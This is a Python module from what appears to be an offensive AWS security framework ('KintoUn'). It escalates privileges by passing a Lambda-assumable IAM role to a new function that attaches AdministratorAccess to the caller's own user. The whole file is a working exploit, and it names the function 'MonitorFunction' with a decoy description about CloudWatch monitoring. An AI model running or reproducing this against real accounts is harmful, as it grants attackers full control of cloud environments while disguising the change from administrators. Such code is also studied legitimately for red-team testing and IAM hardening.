MODULE_METADATA = {
    'name': 'lambda_attach_policy',
    'display_name': 'Lambda Attach Policy',
    'category': 'privilege_escalation',
    'description': 'Create Lambda to attach AdministratorAccess to current IAM user.',
    'requires_region': False,
    'inputs': [
        { 'name': 'role_selection_or_arn', 'type': 'string', 'required': True, 'description': 'Assumable role option or manual role ARN.' },
        { 'name': 'region', 'type': 'region', 'required': True, 'description': 'Region to deploy Lambda.' },
    ],
    'output_type': 'json',
    'risk_level': 'critical'
}
# Create a module that will create a lambda and invoke to attach a user policy on the predetermined user.
import botocore
import os
import zipfile
from modules.enumeration import iam_whoami as whoami
from modules.enumeration import iam_enumerate_assume_role
from functions import create_client, iam_handler, utils
from functions.no_color import Fore, Style

def create_lambda_client(botoconfig, session, region):
    client = create_client.Client(botoconfig, session, 'lambda', region)
    return client.create_aws_client()

# This is the help section. When used, it should print any help to the functionality of the module that may be necessary.
def help():
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Module Description:\n")
    print("\t")

    print("[+] Module Functionality:\n")
    print("\t")

    print("[+] IMPORTANT:\n")
    print("\t")
    print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)

def get_user_name(botoconfig, session):
    user_name = whoami.main(botoconfig, session)

    return user_name

def check_assumable_roles(botoconfig, session):
    iam = iam_handler.IAM(botoconfig, session)
    assumable_roles = iam_enumerate_assume_role.get_assumable_roles(iam)

    lambda_assumable_roles = []
    
    for role in assumable_roles:
        try:
            if role['AssumeRolePolicyDocument']:
                for principal in role['AssumeRolePolicyDocument']['Statement']:
                    if principal['Principal']['Service'] == 'lambda.amazonaws.com':
                        lambda_assumable_roles.append(role['Arn'])
        except (KeyError, TypeError):
            continue
    
    return lambda_assumable_roles

def parse_assumable_role_option(role_list):
    if role_list:
        print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
        print("[+] Select Role:")
        option = 0
        role_options = {}
        for role in role_list:
            role_options[str(option)] = role 
            print("{} - {}".format(str(option), role))
            option += 1
        selected_option = input("\nOption: ")
        if not selected_option or selected_option not in role_options:
            print("\n[-] No valid role selected...exiting...")
            return False
        selected_option = int(selected_option)
        role_name = role_options[str(selected_option)]
        print("[+] Using Role: "+Fore.GREEN+"{}".format(role_name)+Style.RESET_ALL)

        return role_name

    else:
        print(Fore.RED + "[-] No roles to impersonate found..." + Style.RESET_ALL)

def create_lambda_file(user_name):
    lambda_function = '''
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(UserName = '{}', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')

    return response'''.format(user_name)

    try:
        print('[+] Zipping Lambda function...')
        lambda_path = utils.create_temp_zip_path()
        with zipfile.ZipFile(lambda_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('lambda_function.py', lambda_function)
        return lambda_path
    except Exception as e:
        print('Failed to zip Lambda: {}\n'.format(e))
        return None

def aws_file(lambda_path):
    with open(lambda_path, 'rb') as file_data:
        bytes_content = file_data.read()

    return bytes_content

def create_lambda_function(client, function_role, lambda_path):
    response = client.create_function(
        FunctionName="MonitorFunction",
        Runtime="python3.7",
        Role=function_role,
        Handler="lambda_function.lambda_handler",
        Code={
            "ZipFile": aws_file(lambda_path)
        },
        Description="Lambda de monitoramento de Eventos do CloudWatch.",
        Publish=True,
        PackageType="Zip"
       )
    
    return response

def check_lambda_status(client):
    response = client.get_function(
        FunctionName='MonitorFunction'
    )

    if response['Configuration']['State'] == 'Active':
        return True
    else:
        return False

def invoke_lambda(client, function_name):
    response = client.invoke(
        FunctionName=function_name,
    )

    return response


def collect_inputs(assumable_roles):
    role_arn = None
    if not assumable_roles:
        option = input("[-] KintoUn wasn't able to retrieve a list of assumable roles...Do you want to input a role ARN manually? [y/N]")
        if option.lower() == "y":
            role_arn = input("Role Arn: ")
    else:
        role_arn = parse_assumable_role_option(assumable_roles)
    region = input("[+] Select the region to create the lambda function: ")
    return role_arn, region

def main(botoconfig, session):
    results = {}
    print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
    print("[+] Starting lambda privilege escalation module...")

    print("[+] Checking for current username...")
    username = get_user_name(botoconfig, session)

    print("[+] Listing assumable roles...")
    assumable_roles = check_assumable_roles(botoconfig, session)
    role_arn, region = collect_inputs(assumable_roles)
    if not role_arn:
        return utils.module_result(status="error", errors=["No role ARN was selected"])

    print("[+] Creating malicious lambda file...")
    lambda_client = create_lambda_client(botoconfig, session, region)
    lambda_path = create_lambda_file(username)
    if not lambda_path:
        return utils.module_result(status="error", errors=["Failed to create lambda archive"])

    print("[+] Creating malicious lambda function...")
    lambda_function = create_lambda_function(lambda_client, role_arn, lambda_path)
    results["FunctionName"] = lambda_function.get("FunctionName")
    results["FunctionArn"] = lambda_function.get("FunctionArn")
    
    print("[+] Checking for lambda status...")
    token = utils.poll_until(
        lambda: check_lambda_status(lambda_client),
        interval_seconds=10,
        max_attempts=36
    )
    if not token:
        return utils.module_result(status="error", errors=["Timed out waiting for Lambda to become active"])

    print("[+] Invoking malicious lambda function...")
    try:
        function_run_results = invoke_lambda(lambda_client, lambda_function['FunctionName'])
        print("[+] Lambda Invoke Successfull! Enjoy...")
        results["InvokeStatus"] = "success"
    except botocore.exceptions.ClientError as e:
        print("[-] Lambda failed to run...Status code "+Fore.RED+"{}".format(e)+Style.RESET_ALL)
        results["InvokeStatus"] = "failed"
    finally:
        if os.path.exists(lambda_path):
            os.remove(lambda_path)
    return utils.module_result(data=results)
    




